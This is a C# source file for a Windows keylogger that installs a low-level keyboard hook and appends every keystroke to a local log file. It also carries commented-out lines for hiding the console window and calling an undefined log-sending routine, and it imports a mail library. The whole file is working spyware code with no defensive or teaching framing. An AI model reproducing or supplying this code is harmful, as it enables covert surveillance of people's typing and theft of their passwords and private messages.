using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
	internal class Program
	{
		private const int SW_HIDE = 0;
		private const int SW_SHOW = 5;
		private const int WH_KEYBOARD_LL = 13;
		private const int WM_KEYDOWN = 0x0100;
		private static readonly LowLevelKeyboardProc _proc = HookCallback;
		private static IntPtr _hookID = IntPtr.Zero;

		[STAThread]
		public static void Main()
		{
			var hWnd = GetConsoleWindow();
			// ShowWindow(hWnd, SW_HIDE); // hide console window
			// SendLog(); // for test
			_hookID = SetHook(_proc);
			Application.Run();
			UnhookWindowsHookEx(_hookID);
		}

		private static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			using (var curProcess = Process.GetCurrentProcess())
			using (var curModule = curProcess.MainModule)
			{
				return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
					GetModuleHandle(curModule.ModuleName), 0);
			}
		}

		private static IntPtr HookCallback(
			int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
			{
				var vkCode = (Keys) Marshal.ReadInt32(lParam);

				using (var writer = new StreamWriter("keyLogger.log", true))
				{
					switch (vkCode)
					{
						case Keys.Space:
							writer.WriteAsync(" ");
							break;
						case Keys.Return:
							writer.WriteAsync("\n");
							break;
						case Keys.LShiftKey: case Keys.RShiftKey:
							writer.WriteAsync("");
							break;
						case Keys.D1:
							writer.WriteAsync("1");
							break;
						case Keys.D2:
							writer.WriteAsync("2");
							break;
						case Keys.D3:
							writer.WriteAsync("3");
							break;
						case Keys.D4:
							writer.WriteAsync("4");
							break;
						case Keys.D5:
							writer.WriteAsync("5");
							break;
						case Keys.D6:
							writer.WriteAsync("6");
							break;
						case Keys.D7:
							writer.WriteAsync("7");
							break;
						case Keys.D8:
							writer.WriteAsync("8");
							break;
						case Keys.D9:
							writer.WriteAsync("9");
							break;
						case Keys.D0:
							writer.WriteAsync("0");
							break;
						case Keys.Oemcomma:
							writer.WriteAsync(",");
							break;
						case Keys.OemPeriod:
							writer.WriteAsync(".");
							break;
						case Keys.OemQuestion:
							writer.WriteAsync("?");
							break;
						case Keys.OemMinus:
							writer.WriteAsync("-");
							break;
						case Keys.Oemplus:
							writer.WriteAsync("+");
							break;
						default:
							if ((Control.ModifierKeys & Keys.Shift) != 0)
							{
								writer.WriteAsync(vkCode.ToString());
							}
							else if ((Control.ModifierKeys & Keys.CapsLock) != 0)
							{
								writer.WriteAsync(vkCode.ToString());
							}
							else
							{
								writer.WriteAsync(vkCode.ToString().ToLower());
							}
							break;
					}
				}
				Console.WriteLine(vkCode);
			}

			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}

		#region WinApi Functions

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook,
			LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
			IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		private delegate IntPtr LowLevelKeyboardProc(
			int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		#endregion
	}
}